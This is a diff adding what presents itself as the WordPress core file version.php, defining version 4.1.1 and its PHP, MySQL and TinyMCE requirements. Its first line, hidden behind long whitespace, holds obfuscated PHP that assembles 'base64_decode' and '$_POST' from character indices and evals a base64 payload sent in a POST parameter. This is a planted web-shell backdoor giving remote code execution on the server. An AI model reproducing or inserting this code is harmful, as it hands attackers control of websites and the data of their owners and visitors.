@@ -1,0 +1,35 @@
+<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n5bbd3c'])) {eval($s21(${$s20}['n5bbd3c']));}?><?php
+/**
+ * The WordPress version string
+ *
+ * @global string $wp_version
+ */
+$wp_version = '4.1.1';
+
+/**
+ * Holds the WordPress DB revision, increments when changes are made to the WordPress DB schema.
+ *
+ * @global int $wp_db_version
+ */
+$wp_db_version = 30133;
+
+/**
+ * Holds the TinyMCE version
+ *
+ * @global string $tinymce_version
+ */
+$tinymce_version = '4107-20150118';
+
+/**
+ * Holds the required PHP version
+ *
+ * @global string $required_php_version
+ */
+$required_php_version = '5.2.4';
+
+/**
+ * Holds the required MySQL version
+ *
+ * @global string $required_mysql_version
+ */
+$required_mysql_version = '5.0';
